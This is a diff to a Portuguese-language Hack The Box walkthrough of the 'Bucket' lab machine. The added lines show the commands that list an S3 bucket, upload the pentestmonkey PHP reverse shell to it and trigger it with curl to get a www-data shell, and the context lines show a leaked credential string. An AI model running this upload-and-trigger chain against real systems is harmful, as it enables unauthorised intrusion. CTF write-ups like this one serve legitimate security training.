@@ -109,15 +109,24 @@ Sysadm:n2vM-<_K_Q:.Aa2
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Ao tentar valida-las via SSH, nenhum login foi possível
 
-Listando os arquivos:
+Listando os arquivos e diretórios:
 
 ![Image](https://i.imgur.com/updbyQp.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+aws --endpoint-url http://s3.bucket.htb/ s3 ls
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Após isso, tentamos fazer o upload de uma reverse shell para o servidor.
 No nosso caso vamos utilizar a [shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) do 'Pentest Monkeys' 
 
 ![Image](https://i.imgur.com/VLLIuAS.png)
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+aws --endpoint-url http://s3.bucket.htb/ s3 cp ./chu.php s3://adserver
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Em seguida usamos o curl para chamar nosso arquivo com a shell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+curl http://bucket.htb/chu.php
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 w00t temos uma shell como www-data, vamos tentar melhorar nossa shell com python
 
 ![Image](https://i.imgur.com/24FbvOg.png)
